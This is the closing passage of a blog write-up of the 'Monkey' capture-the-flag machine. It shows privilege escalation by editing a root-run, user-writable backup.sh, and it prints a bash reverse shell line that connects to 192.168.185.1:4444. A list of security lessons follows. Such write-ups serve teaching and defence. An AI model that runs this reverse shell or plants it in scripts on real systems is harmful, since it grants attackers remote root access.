+    <source type="image/webp" srcset="/post/monkey-hm-writeup/images/10_hu_366f45a553eb32a5.webp 320w, /post/monkey-hm-writeup/images/10_hu_afb856ef5bbed9f2.webp 640w, /post/monkey-hm-writeup/images/10_hu_c61c5f9b3906576e.webp 960w, /post/monkey-hm-writeup/images/10_hu_790d7b45fa6ccd2d.webp 1280w, /post/monkey-hm-writeup/images/10_hu_c769162a3368b022.webp 1600w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <source type="image/jpeg" srcset="/post/monkey-hm-writeup/images/10_hu_4bea85bfb8e99771.jpg 320w, /post/monkey-hm-writeup/images/10_hu_876473ddac77de01.jpg 640w, /post/monkey-hm-writeup/images/10_hu_de0081fe6b8d72f6.jpg 960w, /post/monkey-hm-writeup/images/10_hu_4afb95e7892a5ba4.jpg 1280w, /post/monkey-hm-writeup/images/10_hu_18ee94b8dea919a9.jpg 1600w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <img class="h-auto max-w-full rounded-lg" src="/post/monkey-hm-writeup/images/10_hu_876473ddac77de01.jpg" width="1797" height="644" alt="" title="" loading="lazy" />
+  </picture>
+</div>
+</p>
+<h2 id="privilege-escalation---misconfigured-permissions">Privilege Escalation - Misconfigured Permissions</h2>
+<p>Turns out our user has write permissions over <code>backup.sh</code> (point 1 in the image). The script runs commands as root and writes to <code>/tmp/backup.zip</code>, which is owned by root and constantly updated (point 2).</p>
+<p><div class="not-prose">
+<picture>
+    <source type="image/webp" srcset="/post/monkey-hm-writeup/images/11_hu_cc1db1560d3e85ba.webp 320w, /post/monkey-hm-writeup/images/11_hu_36c91bca53ad55ab.webp 640w, /post/monkey-hm-writeup/images/11_hu_78cf0484cc438b14.webp 960w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <source type="image/jpeg" srcset="/post/monkey-hm-writeup/images/11_hu_22e364318a7a250b.jpg 320w, /post/monkey-hm-writeup/images/11_hu_4be33fda72d5fbe1.jpg 640w, /post/monkey-hm-writeup/images/11_hu_8e3c37fc816ecf08.jpg 960w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <img class="h-auto max-w-full rounded-lg" src="/post/monkey-hm-writeup/images/11_hu_4be33fda72d5fbe1.jpg" width="1278" height="186" alt="" title="" loading="lazy" />
+  </picture>
+</div>
+</p>
+<p>So we edited the script to add a reverse shell:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/bin/sh -i &gt;<span class="p">&amp;</span> /dev/tcp/192.168.185.1/4444 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span></code></pre></div><p>Then we listened on port 4444. When the scheduled task triggered, we got root access and could read the second flag.</p>
+<p><div class="not-prose">
+<picture>
+    <source type="image/webp" srcset="/post/monkey-hm-writeup/images/12_hu_d5ef532b625bb8e6.webp 320w, /post/monkey-hm-writeup/images/12_hu_1de6c2d2eb2d9342.webp 640w, /post/monkey-hm-writeup/images/12_hu_675b3d00270d8799.webp 960w, /post/monkey-hm-writeup/images/12_hu_861c1b262a4f221a.webp 1280w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <source type="image/jpeg" srcset="/post/monkey-hm-writeup/images/12_hu_31f5fa491822f14.jpg 320w, /post/monkey-hm-writeup/images/12_hu_e347356eed24f0c1.jpg 640w, /post/monkey-hm-writeup/images/12_hu_ce47e5976f8fea7.jpg 960w, /post/monkey-hm-writeup/images/12_hu_716b84f62c1417bb.jpg 1280w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <img class="h-auto max-w-full rounded-lg" src="/post/monkey-hm-writeup/images/12_hu_e347356eed24f0c1.jpg" width="1324" height="953" alt="" title="" loading="lazy" />
+  </picture>
+</div>
+</p>
+<h2 id="conclusions">Conclusions</h2>
+<p>What can we learn from this?</p>
+<ul>
+<li><strong>Weak/default credentials:</strong> The admin account had weak credentials. The student reset feature used the same default password every time. Enforcing strong password policies would help.</li>
+<li><strong>Lack of validation:</strong> The system didn&rsquo;t check if the uploaded file was really an image. Always validate user input.</li>
+<li><strong>Credential reuse:</strong> The same credentials were used for the web app and SSH. Avoid using the same credentials across different services.</li>
+<li><strong>Poor permission management:</strong> A low-privileged user could edit a script executed by root. Such configurations should be avoided or better managed.</li>
+</ul>
+<p>These kinds of vulnerabilities <em>do</em> exist in real systems, so it’s good to learn from them. And in our case, it’s also fun 😄</p>
+<p><em>-Hackers are people too</em> 😜</p>
+<p>If you have questions or something, feel free to leave a comment. And hey, I see that may be possible to get root with other ways, did you find another way to solve it? Let me know—I’d love to hear it! 😄</p>
+
+      </article>
+
+      
+
+
+
+
+
+<section class="flex flex-col md:flex-row mx-2 md:mx-0 gap-2 md:gap-0 justify-between w-full max-w-4xl lg:max-w-5xl py-6 text-slate-500 dark:text-slate-300">
+    <div class="flex flex-row">
+        <span>Share on:</span>
+        <a href="https://x.com/intent/tweet?url=%f0%9f%99%8c%20This%20article%20is%20a%20great%20read.%20Check%20it%20out%21%0a%f0%9f%91%89https%3a%2f%2fdrayko.github.io%2fpost%2fmonkey-hm-writeup%2f"
+            target="_blank" title="" class="flex flex-row mr-2">
+            <span class="hidden">Twitter</span>
+            <i class="h-6 w-6 flex-none"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-x" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M4 4l11.733 16h4.267l-11.733 -16z"></path>
+   <path d="M4 20l6.768 -6.768m2.46 -2.46l6.772 -6.772"></path>
+</svg>
+</i>
+        </a>
+        <a href="https://wa.me/?text=%f0%9f%99%8c%20This%20article%20is%20a%20great%20read.%20Check%20it%20out%21%0a%f0%9f%91%89 https%3a%2f%2fdrayko.github.io%2fpost%2fmonkey-hm-writeup%2f"
+            target="_blank" title="" class="flex flex-row mr-2">
+            <span class="hidden">Whatsapp</span>
+            <i class="h-6 w-6 flex-none"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-whatsapp" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 21l1.65 -3.8a9 9 0 1 1 3.4 2.9l-5.05 .9" /><path d="M9 10a.5 .5 0 0 0 1 0v-1a.5 .5 0 0 0 -1 0v1a5 5 0 0 0 5 5h1a.5 .5 0 0 0 0 -1h-1a.5 .5 0 0 0 0 1" /></svg></i>
+        </a>
+        <a href="https://www.facebook.com/sharer.php?u=%f0%9f%99%8c%20This%20article%20is%20a%20great%20read.%20Check%20it%20out%21%0a%f0%9f%91%89https%3a%2f%2fdrayko.github.io%2fpost%2fmonkey-hm-writeup%2f" target="_blank"
+            title="" class="flex flex-row mr-2">
+            <span class="hidden">Facebook</span>
+            <i class="h-6 w-6 flex-none"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-facebook" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M7 10v4h3v7h4v-7h3l1 -4h-4v-2a1 1 0 0 1 1 -1h3v-4h-3a5 5 0 0 0 -5 5v2h-3"></path>
+</svg>
+</i>
+        </a>
+        <a href="https://www.linkedin.com/feed/?shareActive=true&text=%f0%9f%99%8c%20This%20article%20is%20a%20great%20read.%20Check%20it%20out%21%0a%f0%9f%91%89https%3a%2f%2fdrayko.github.io%2fpost%2fmonkey-hm-writeup%2f"
+            target="_blank" title="" class="flex flex-row mr-2">
+            <span class="hidden">LinkedIn</span>
+            <i class="h-6 w-6 flex-none"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-linkedin" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path
+     stroke="none"
+     d="M0 0h24v24H0z"
+     fill="none"
+     id="path2" />
+  <path
+     d="m 1.5547568,1.5547568 m 0,2.6113108 A 2.6113108,2.6113108 0 0 1 4.1660676,1.5547568 H 19.833932 a 2.6113108,2.6113108 0 0 1 2.611311,2.6113108 V 19.833932 a 2.6113108,2.6113108 0 0 1 -2.611311,2.611311 H 4.1660676 A 2.6113108,2.6113108 0 0 1 1.5547568,19.833932 Z"
+     id="path4"/>
+  <path
+     d="m 6.7773784,10.694345 v 6.528277"
+     id="path6"/>
+  <path
+     d="m 6.7773784,6.7773784 v 0.013057"
+     id="path8"/>
+  <path
+     d="M 12,17.222622 V 10.694345"
+     id="path10"/>
+  <path
+     d="m 17.222622,17.222622 v -3.916967 a 2.611311,2.611311 0 0 0 -5.222622,0"
+     id="path12"/>
+</svg>
+</i>
+        </a>
+        
+    </div>
+</section>
+
+      
+
+
+  
+<script type="text/javascript">
+  (function() {
+    const themeToggle = document.querySelector('.darkmode-toggle input');
+    const light = 'light';
+    const dark = 'dark';
+    let isDark = localStorage.theme === dark || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches);
+    let theme = isDark ? dark : light;
+
+    const s = document.createElement('script');
+    s.type = 'text/javascript';
+    const dataset = {
+        repo: 'Drayko\/Drayko.github.io',
+        repoId: 'MDEwOlJlcG9zaXRvcnkyODM2MTA0MjY=',
+        category: 'Q\u0026A',
+        categoryId: 'DIC_kwDOEOeNOs4Co4JS',
+        mapping: 'pathname',
+        reactionsEnabled: '1',
+        emitMetadata: '0',
+        theme: theme,
+        lang: 'en',
+    };
+    s.src = 'https://giscus.app/client.js';
+    s.crossorigin = 'anonymous';
+    s.async = true;
+    Object.entries(dataset).forEach(function(a) {
+        return s.dataset[a[0]] = a[1];
+    });
+
+    const curScriptElement = document.currentScript;
+    curScriptElement.parentNode.insertBefore(s, curScriptElement);
+
+    function sendMessage(message) {
+      const iframe = document.querySelector('iframe.giscus-frame');
+      
+      if (!iframe) return;
+      iframe.contentWindow.postMessage({ giscus: message }, 'https://giscus.app');
+    }
+
+    themeToggle.addEventListener('change', function () {
+      if (this.checked) {
+        theme = dark;
+      } else {
+        theme = light;
+      }
+      sendMessage({
+        setConfig: {
+          theme: theme,
+        }
+      });
+    });
+  })();
+</script>
+  
+
+
+
+    </div>
+  </div>
+</div>
+
+  </main>
+  <footer class="flex flex-none justify-center">
+    <section class="flex flex-col md:flex-row mx-2 md:mx-0 gap-2 md:gap-0 justify-between w-full max-w-4xl lg:max-w-5xl py-6 text-slate-500 dark:text-slate-300">
+  <div class="flex flex-row">
+    
+  
+  
+    <a href="https://www.linkedin.com/in/drayko" target="_blank" title="LinkedIn" class="flex flex-row mr-2">
+      <span class="hidden">LinkedIn</span>
+      <i class="h-6 w-6 flex-none"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-linkedin" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path
+     stroke="none"
+     d="M0 0h24v24H0z"
+     fill="none"
+     id="path2" />
+  <path
+     d="m 1.5547568,1.5547568 m 0,2.6113108 A 2.6113108,2.6113108 0 0 1 4.1660676,1.5547568 H 19.833932 a 2.6113108,2.6113108 0 0 1 2.611311,2.6113108 V 19.833932 a 2.6113108,2.6113108 0 0 1 -2.611311,2.611311 H 4.1660676 A 2.6113108,2.6113108 0 0 1 1.5547568,19.833932 Z"
+     id="path4"/>
+  <path
+     d="m 6.7773784,10.694345 v 6.528277"
+     id="path6"/>
+  <path
+     d="m 6.7773784,6.7773784 v 0.013057"
+     id="path8"/>
+  <path
+     d="M 12,17.222622 V 10.694345"
+     id="path10"/>
+  <path
+     d="m 17.222622,17.222622 v -3.916967 a 2.611311,2.611311 0 0 0 -5.222622,0"
+     id="path12"/>
+</svg>
+ </i>
+    </a>
+  
+  
+  
+    <a href="https://github.com/drayko" target="_blank" title="Github" class="flex flex-row mr-2">
+      <span class="hidden">Github</span>
+      <i class="h-6 w-6 flex-none"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"></path>
+</svg>
+ </i>
+    </a>
+  
+  
+  
+    <a href="https://x.com/draykoes" target="_blank" title="Twitter" class="flex flex-row mr-2">
+      <span class="hidden">Twitter</span>
+      <i class="h-6 w-6 flex-none"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-x" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M4 4l11.733 16h4.267l-11.733 -16z"></path>
+   <path d="M4 20l6.768 -6.768m2.46 -2.46l6.772 -6.772"></path>
+</svg>
+ </i>
+    </a>
+  
+  
+  
+    <a href="https://t.me/draykoes" target="_blank" title="Telegram" class="flex flex-row mr-2">
+      <span class="hidden">Telegram</span>
+      <i class="h-6 w-6 flex-none"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-telegram" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+    <path d="M15 10l-4 4l6 6l4 -16l-18 7l4 2l2 6l3 -4" />
+</svg>
+ </i>
+    </a>
+  
+  
+  
+  
+  
+    <a href="https://www.facebook.com/draykoes" target="_blank" title="Facebook" class="flex flex-row mr-2">
+      <span class="hidden">Facebook</span>
+      <i class="h-6 w-6 flex-none"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-facebook" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M7 10v4h3v7h4v-7h3l1 -4h-4v-2a1 1 0 0 1 1 -1h3v-4h-3a5 5 0 0 0 -5 5v2h-3"></path>
+</svg>
+ </i>
+    </a>
+  
+  
+  
+    <a href="https://www.instagram.com/draykoes" target="_blank" title="Instagram" class="flex flex-row mr-2">
+      <span class="hidden">Instagram</span>
+      <i class="h-6 w-6 flex-none"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-instagram" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M4 4m0 4a4 4 0 0 1 4 -4h8a4 4 0 0 1 4 4v8a4 4 0 0 1 -4 4h-8a4 4 0 0 1 -4 -4z"></path>
+   <path d="M12 12m-3 0a3 3 0 1 0 6 0a3 3 0 1 0 -6 0"></path>
+   <path d="M16.5 7.5l0 .01"></path>
+</svg>
+ </i>
+    </a>
+  
+  
+  
+    <a href="https://bsky.app/profile/draykoes.bsky.social" target="_blank" title="Bluesky" class="flex flex-row mr-2">
+      <span class="hidden">Bluesky</span>
+      <i class="h-6 w-6 flex-none"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+    class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bluesky">
+    <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+    <path
+        d="M6.335 5.144c-1.654 -1.199 -4.335 -2.127 -4.335 .826c0 .59 .35 4.953 .556 5.661c.713 2.463 3.13 2.75 5.444 2.369c-4.045 .665 -4.889 3.208 -2.667 5.41c1.03 1.018 1.913 1.59 2.667 1.59c2 0 3.134 -2.769 3.5 -3.5c.333 -.667 .5 -1.167 .5 -1.5c0 .333 .167 .833 .5 1.5c.366 .731 1.5 3.5 3.5 3.5c.754 0 1.637 -.571 2.667 -1.59c2.222 -2.203 1.378 -4.746 -2.667 -5.41c2.314 .38 4.73 .094 5.444 -2.369c.206 -.708 .556 -5.072 .556 -5.661c0 -2.953 -2.68 -2.025 -4.335 -.826c-2.293 1.662 -4.76 5.048 -5.665 6.856c-.905 -1.808 -3.372 -5.194 -5.665 -6.856z" />
+</svg>
+ </i>
+    </a>
+  
+  
+
+
+  </div>
+  <div class="grow"></div>
+  <div class="flex flex-row">
+    <i class="h-6 w-6 flex-none"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M12 12m-9 0a9 9 0 1 0 18 0a9 9 0 1 0 -18 0"></path>
+   <path d="M14 9.75a3.016 3.016 0 0 0 -4.163 .173a2.993 2.993 0 0 0 0 4.154a3.016 3.016 0 0 0 4.163 .173"></path>
+</svg>
+</i> 2010 - 2025 Drayko Escobar
+    
+  </div>
+  
+</section>
+
+  </footer>
+  <script src="/main.min.65ca5b0808abf278fcec5d424701ebf0b4bc46a737129cd5e57fdb739f463e79.js"></script>
+
+<div class="hidden top-1 right-1" id="code-copy">
+  <i class="h-6 w-6 block">
+    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" />
+  <path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" />
+</svg>
+
+  </i>
+</div>
+<div class="hidden top-1 right-1" id="code-copy-done">
+  <i class="h-6 w-6 block">
+    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-check" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M5 12l5 5l10 -10" />
+</svg>
+
+  </i>
+</div><script src="/code-copy.min.e7b2a74adef1ed474c335c8bd5e7832b2316b8842b0f9184d65286c5bd64f51a.js"></script>
+
+
+
+
+
+</body>
+</html>
